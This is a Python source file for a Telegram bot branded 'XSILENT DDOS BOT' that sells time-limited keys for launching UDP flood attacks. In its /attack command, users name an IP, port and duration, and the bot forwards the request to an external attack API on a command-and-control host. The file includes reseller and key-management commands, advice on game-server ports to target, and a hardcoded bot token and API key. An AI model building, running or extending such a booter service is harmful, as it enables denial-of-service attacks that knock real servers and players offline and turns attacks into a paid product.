#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict

# ========== CONFIG ==========
BOT_TOKEN = "8760406918:AAHk0XYSysz4nJElHEq4y7eIbIBqUL9Or3M"
ADMIN_ID = ["8487946379"]
USERS_FILE = "users.json"
KEYS_FILE = "keys.json"
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "PFC10J"
MAX_CONCURRENT = 2

# ========== DATA STRUCTURES ==========
active_attacks = {}
user_attacks = defaultdict(list)
cooldown = {}
keys_data = {}

# ========== FILE FUNCTIONS ==========
def load_users():
    try:
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {"users": [ADMIN_ID[0]], "resellers": []}

def load_keys():
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_users(data):
    with open(USERS_FILE, 'w') as f:
        json.dump(data, f)

def save_keys(data):
    with open(KEYS_FILE, 'w') as f:
        json.dump(data, f)

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if "hour" in duration_str:
        hours = re.findall(r'\d+', duration_str)
        if hours:
            return int(hours[0]), "hour"
    
    if "day" in duration_str:
        days = re.findall(r'\d+', duration_str)
        if days:
            return int(days[0]), "day"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return f"{value} Hour(s)"
    else:
        return f"{value} Day(s)"

def check_user_active_attacks(user_id):
    active_count = 0
    now = time.time()
    for attack_id in user_attacks.get(user_id, []):
        if attack_id in active_attacks:
            if now < active_attacks[attack_id]["finish_time"]:
                active_count += 1
    return active_count

def check_active_attack_by_target(ip, port):
    target_key = f"{ip}:{port}"
    now = time.time()
    for attack_id, attack_info in active_attacks.items():
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    active_list = []
    
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            active_list.append(f"🎯 {info['target_key']}\n   👤 {info['user']}\n   ⏰ {remaining}s left")
        else:
            del active_attacks[attack_id]
    
    return active_list

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    users_data["users"] = users
    save_users(users_data)
    
    for attack_id in user_attacks.get(user_id, []):
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    if user_id in user_attacks:
        del user_attacks[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    
    if uid in users or uid in ADMIN_ID:
        has_active = check_user_expiry(uid)
        
        bot.reply_to(msg, f"""🔥 XSILENT DDOS BOT 🔥

✅ Status: {'Active' if has_active else 'Authorized'}
⚡ Concurrent Attacks: {MAX_CONCURRENT} (Everyone)
⏱️ Max Time: 300s
🌐 API: Power by CNC

📝 COMMANDS:
/attack IP PORT TIME - Launch UDP attack
/status - Check attack slots
/methods - Show attack methods
/stats - Your stats
/mykeys - Your active keys
/help - Help menu
/redeem KEY - Redeem access key

👑 ADMIN/RESELLER:
/genkey USER_ID 1 - 1 day key
/genkey USER_ID 5hours - 5 hours key
/genkey USER_ID 7 - 7 days key
/removekey KEY - Remove a key
/removeuser USER_ID - Remove user
/broadcast MESSAGE - Broadcast message
/stopattack IP:PORT - Stop any attack

Buy: XSILENT""")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Buy access: XSILENT\nUse /redeem KEY to activate")

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, "❌ Your access has expired! Please get a new key.\nContact: XSILENT")
        return
    
    user_active = check_user_active_attacks(uid)
    if user_active >= MAX_CONCURRENT:
        bot.reply_to(msg, f"❌ You already have {user_active} active attack(s)!\nMax concurrent: {MAX_CONCURRENT}\nUse /status to check or wait for them to finish.")
        return
    
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, f"⏳ Wait {int(remaining)} seconds!")
            return
    
    args = msg.text.split()
    if len(args) != 4:
        bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
        return
    
    ip, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        duration = int(duration)
        if duration < 10 or duration > 300:
            bot.reply_to(msg, "❌ Duration 10-300 seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port or time!")
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, f"""❌ TARGET UNDER ATTACK!

🎯 {ip}:{port} is already being attacked
👤 By: {existing_attack['user']}
⏰ Finishes in: {remaining} seconds

Please wait or choose another target!""")
        return
    
    cooldown[uid] = time.time()
    
    attack_id = f"{uid}_{int(time.time())}"
    target_key = f"{ip}:{port}"
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    user_attacks[uid].append(attack_id)
    
    bot.reply_to(msg, f"""🔥 ATTACK LAUNCHED! 🔥

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
⚡ Method: UDP (Auto)
💥 Status: Attack in progress...
📊 Your active attacks: {user_active + 1}/{MAX_CONCURRENT}

Use /status to check slot availability""")
    
    def run():
        try:
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": "udp"
            }
            
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            if response.status_code == 200:
                time.sleep(duration)
                bot.send_message(msg.chat.id, f"""✅ ATTACK FINISHED!

🎯 Target: {ip}:{port}
⏱️ Duration: {duration}s
💥 Attack completed!

🔄 Restart your game/client if needed
📊 Active attacks left: {check_user_active_attacks(uid)}""")
            else:
                bot.send_message(msg.chat.id, f"❌ Attack failed! API Status: {response.status_code}")
                
        except Exception as e:
            bot.send_message(msg.chat.id, f"❌ Attack error: {str(e)[:50]}")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if uid in user_attacks and attack_id in user_attacks[uid]:
                user_attacks[uid].remove(attack_id)
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    active_list = format_attack_status()
    
    if active_list:
        status_msg = f"""⚠️ ACTIVE ATTACKS ({len(active_list)}) ⚠️

{chr(10).join(active_list)}

{'='*30}"""
    else:
        status_msg = """✅ ALL SLOTS FREE ✅

No ongoing attacks detected

💡 You can start a new attack now!
Use: /attack IP PORT TIME"""
    
    user_active = check_user_active_attacks(uid)
    
    status_msg += f"\n\n📊 YOUR STATUS:\n• Active: {user_active}/{MAX_CONCURRENT}\n• Cooldown: {'Yes' if uid in cooldown else 'No'}"
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, """Usage: /genkey USER_ID DURATION

Examples:
/genkey 123456789 1        - 1 day key
/genkey 123456789 5hours   - 5 hours key
/genkey 123456789 3days    - 3 days key""")
        return
    
    target_user = args[1]
    duration_str = args[2]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration! Use: 1, 2, 5hours, 3days, 12hours")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": target_user,
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    bot.reply_to(msg, f"""✅ KEY GENERATED!

🔑 Key: {key}
👤 For User: {target_user}
⏰ Duration: {duration_display}
📅 Expires: {expiry_str}
👑 Generated by: {uid}

Share this key with the user!
User should use: /redeem {key}""")

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removekey KEY\nExample: /removekey ABC123XYZ")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    
    key_info = keys_data[key]
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, f"""✅ KEY REMOVED!

🔑 Key: {key}
👤 For User: {key_info['user_id']}
⏰ Duration: {format_duration(key_info['duration_value'], key_info['duration_unit'])}
❌ Status: Removed from system""")

@bot.message_handler(commands=['removeuser'])
def remove_user_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removeuser USER_ID\nExample: /removeuser 123456789")
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove admin!")
        return
    
    if target_user not in users:
        bot.reply_to(msg, "❌ User not found!")
        return
    
    remove_user_from_system(target_user)
    
    bot.reply_to(msg, f"""✅ USER REMOVED!

👤 User: {target_user}
❌ Status: Removed from system
💡 All active attacks stopped""")
    
    try:
        bot.send_message(target_user, "⚠️ Your access has been revoked by admin!")
    except:
        pass

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if time.time() > key_info["expires_at"]:
        bot.reply_to(msg, "❌ Key has expired!")
        del keys_data[key]
        save_keys(keys_data)
        return
    
    if key_info["user_id"] != uid:
        bot.reply_to(msg, f"❌ This key is for user {key_info['user_id']} only!")
        return
    
    if uid not in users:
        users.append(uid)
    
    users_data["users"] = users
    save_users(users_data)
    
    keys_data[key]["used"] = True
    keys_data[key]["used_at"] = time.time()
    keys_data[key]["used_by"] = uid
    save_keys(keys_data)
    
    duration_display = format_duration(key_info['duration_value'], key_info['duration_unit'])
    expiry_str = datetime.fromtimestamp(key_info['expires_at']).strftime('%Y-%m-%d %H:%M:%S')
    
    bot.reply_to(msg, f"""✅ ACCESS GRANTED!

🎉 User {uid} has been activated!
🔑 Key: {key}
⏰ Duration: {duration_display}
📅 Expires: {expiry_str}
⚡ Concurrent Attacks: {MAX_CONCURRENT}

You now have access to all bot commands!
Use /start to see available commands.""")

@bot.message_handler(commands=['mykeys'])
def mykeys(msg):
    uid = str(msg.chat.id)
    
    if uid not in users and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    user_keys = []
    now = time.time()
    
    for key, info in keys_data.items():
        if info["user_id"] == uid and not info.get("used", False):
            if now < info["expires_at"]:
                expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d %H:%M')
                duration_display = format_duration(info['duration_value'], info['duration_unit'])
                user_keys.append(f"🔑 {key}\n   Duration: {duration_display}\n   Expires: {expires}")
    
    active_key = None
    for key, info in keys_data.items():
        if info.get("used_by") == uid and info.get("used", False):
            if now < info["expires_at"]:
                expires = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d %H:%M')
                duration_display = format_duration(info['duration_value'], info['duration_unit'])
                active_key = f"✅ ACTIVE KEY:\n🔑 {key}\n   Duration: {duration_display}\n   Expires: {expires}"
    
    if user_keys:
        response = f"📋 YOUR UNUSED KEYS:\n\n{chr(10).join(user_keys)}"
        if active_key:
            response += f"\n\n{active_key}"
        bot.reply_to(msg, response)
    elif active_key:
        bot.reply_to(msg, active_key)
    else:
        bot.reply_to(msg, "📋 No active keys found!\nContact admin to purchase: XSILENT")

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    
    if new_reseller in resellers:
        bot.reply_to(msg, f"❌ User {new_reseller} is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, f"""✅ RESELLER ADDED!

👤 Reseller: {new_reseller}
🔑 Can now generate keys using /genkey""")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /broadcast MESSAGE\nExample: /broadcast Server maintenance at 2 AM")
        return
    
    message = args[1]
    
    success_count = 0
    fail_count = 0
    
    for user in users:
        try:
            bot.send_message(user, f"""📢 BROADCAST MESSAGE 📢

{message}

🕐 Sent: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👑 From: Admin""")
            success_count += 1
        except:
            fail_count += 1
    
        bot.reply_to(msg, f"""✅ BROADCAST SENT!

📨 Message: {message}
✅ Delivered: {success_count} users
❌ Failed: {fail_count} users
👥 Total users: {len(users)}""")

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /stopattack IP:PORT\nExample: /stopattack 1.1.1.1:443")
        return
    
    target = args[1]
    
    stopped = False
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            if info["user"] in user_attacks:
                if attack_id in user_attacks[info["user"]]:
                    user_attacks[info["user"]].remove(attack_id)
            stopped = True
            
            bot.reply_to(msg, f"""✅ ATTACK STOPPED!

🎯 Target: {target}
👤 Attacker: {info['user']}
👑 Stopped by: Admin {uid}""")
            
            try:
                bot.send_message(info['user'], f"⚠️ Your attack on {target} was stopped by admin!")
            except:
                pass
            break
    
    if not stopped:
        bot.reply_to(msg, f"❌ No active attack found on {target}")

@bot.message_handler(commands=['methods'])
def methods(msg):
    bot.reply_to(msg, """⚡ ATTACK METHODS (UDP AUTO) ⚡

💡 UDP FLOOD (Auto-Applied)
   - Best for gaming (BGMI, Minecraft, GTA)
   - Recommended ports: 443, 8080, 14000, 27015-27030

🎯 USAGE:
/attack IP PORT TIME

Example: /attack 1.1.1.1 443 60
→ Auto uses UDP method

⚡ Concurrent Attacks: 2 for everyone!""")

@bot.message_handler(commands=['stats'])
def stats(msg):
    uid = str(msg.chat.id)
    is_admin = uid in ADMIN_ID
    is_reseller = uid in resellers
    user_active = check_user_active_attacks(uid)
    has_active = check_user_expiry(uid)
    
    expiry_info = "No active key"
    for key, info in keys_data.items():
        if info.get("used_by") == uid and info.get("used") == True:
            if time.time() < info["expires_at"]:
                expiry_info = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d %H:%M')
    
    stats_msg = f"""📊 USER STATISTICS

👤 User ID: {uid}
✅ Status: {'Active' if has_active else 'Expired'}
👑 Role: {'Admin' if is_admin else 'Reseller' if is_reseller else 'User'}
💪 Active Attacks: {user_active}/{MAX_CONCURRENT}
⏰ Cooldown: {'Active' if uid in cooldown else 'None'}
📅 Key Expires: {expiry_info}

📈 SYSTEM INFO:
• Total Users: {len(users)}
• Resellers: {len(resellers)}
• Active Attacks: {len(active_attacks)}
• Max Concurrent: {MAX_CONCURRENT} (Everyone)"""
    
    if is_admin:
        stats_msg += f"\n\n🔑 Total Keys Generated: {len(keys_data)}\n📝 Used Keys: {sum(1 for k in keys_data.values() if k.get('used', False))}"
    
    bot.reply_to(msg, stats_msg)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    is_admin = uid in ADMIN_ID
    is_reseller = uid in resellers
    
    help_text = """🔥 XSILENT DDOS BOT HELP 🔥

📝 USER COMMANDS:
/attack IP PORT TIME - Launch UDP attack
/status - Check attack slots
/methods - Show attack methods
/stats - Your statistics
/mykeys - Your active keys
/help - This menu
/redeem KEY - Redeem access key

"""
    
    if is_reseller or is_admin:
        help_text += """👑 RESELLER COMMANDS:
/genkey USER_ID DURATION - Generate key
   Examples:
   /genkey 123456789 1        - 1 day key
   /genkey 123456789 5hours   - 5 hours key
   /genkey 123456789 7        - 7 days key

"""
    
    if is_admin:
        help_text += """⚡ ADMIN COMMANDS:
/add USER_ID - Add user
/removeuser USER_ID - Remove user completely
/removekey KEY - Remove a key
/allusers - List all users
/stopattack IP:PORT - Stop any attack
/broadcast MESSAGE - Send to all users
/addreseller USER_ID - Add reseller
/api_status - Check API status

"""
    
    help_text += f"""💡 FEATURES:
• {MAX_CONCURRENT} concurrent attacks for everyone
• 30 second cooldown between attacks
• Max 300 seconds per attack
• UDP method auto-applied

Buy keys: Contact admin"""
    
    bot.reply_to(msg, help_text)

@bot.message_handler(commands=['add'])
def add_user(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    new = args[1]
    if new not in users:
        users.append(new)
        users_data["users"] = users
        save_users(users_data)
        bot.reply_to(msg, f"✅ User {new} added!")
    else:
        bot.reply_to(msg, "User already exists!")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    user_list = "\n".join(users)
    bot.reply_to(msg, f"📋 ALL USERS:\n{user_list}\n\nTotal: {len(users)}\n👑 Admins: {', '.join(ADMIN_ID)}\n💎 Resellers: {', '.join(resellers) if resellers else 'None'}")

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Admin only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        status = f"""🌐 API STATUS

📡 API URL: {API_URL}
🔑 API Key: {API_KEY[:6]}...{API_KEY[-4:]}
✅ Status: {'Online' if test_response.status_code == 200 else 'Offline'}
📊 Response Code: {test_response.status_code}
🎯 Active Attacks: {len(active_attacks)}"""
        bot.reply_to(msg, status)
    except:
        bot.reply_to(msg, "🌐 API STATUS: OFFLINE\nCannot connect to API server!")

def cleanup_attacks():
    while True:
        time.sleep(5)
        now = time.time()
        
        for attack_id, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[attack_id]
        
        for key, info in list(keys_data.items()):
            if info.get("used", False) and now > info["expires_at"]:
                user_id = info.get("used_by")
                if user_id and user_id in users:
                    has_other = False
                    for k, v in keys_data.items():
                        if v.get("used_by") == user_id and v.get("used", False) and k != key:
                            if now < v["expires_at"]:
                                has_other = True
                                break
                    if not has_other:
                        if user_id in users and user_id not in ADMIN_ID:
                            users.remove(user_id)
                            users_data["users"] = users
                            save_users(users_data)

cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
cleanup_thread.start()

print("""
╔══════════════════════════════════════════════════════════╗
║         🔥 XSILENT BOT STARTED - ENHANCED EDITION 🔥     ║
╠══════════════════════════════════════════════════════════╣
║  ✅ Bot Online                                           ║
║  ✅ Concurrent Attacks: 2 (Everyone)                    ║
║  ✅ Flexible Keys: Hours/Days                           ║
║  ✅ Key Format: /genkey USER 1 or 5hours or 3days      ║
║  ✅ Key Removal System                                  ║
║  ✅ User Removal System                                 ║
║  ✅ Auto Expiry Check                                   ║
║  ✅ Admin: 8487946379                                   ║
╚══════════════════════════════════════════════════════════╝
""")

bot.infinity_polling()
```
